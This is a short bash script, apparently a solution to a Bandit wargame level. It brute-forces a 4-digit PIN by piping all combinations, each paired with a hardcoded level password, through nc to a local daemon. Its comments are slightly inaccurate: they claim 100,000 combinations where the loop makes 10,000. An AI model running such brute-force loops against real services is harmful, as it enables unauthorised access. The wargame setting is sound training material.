#!/bin/bash
# I used this for bandit wargames level 24. Uncomment the portnumber if you want to use it

#simple script that will generate and echo out 100,000 combinations of a 4 digit pincode
#You can use this to echo into a telnet/nc client for example, if a daemon is listening on a certain port for a password


for i in {0..9}{0..9}{0..9}{0..9}
do
	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> passwords #creates a dictionary 
done

#create variable called portnumber
portnumber=30002
#the following code shall attempt all the possible combinations and save it in result
cat passwords | nc localhost $portnumber >> result

#the following code shall find all the unique occurances in result
#which means it'll find the password
sort result -u 
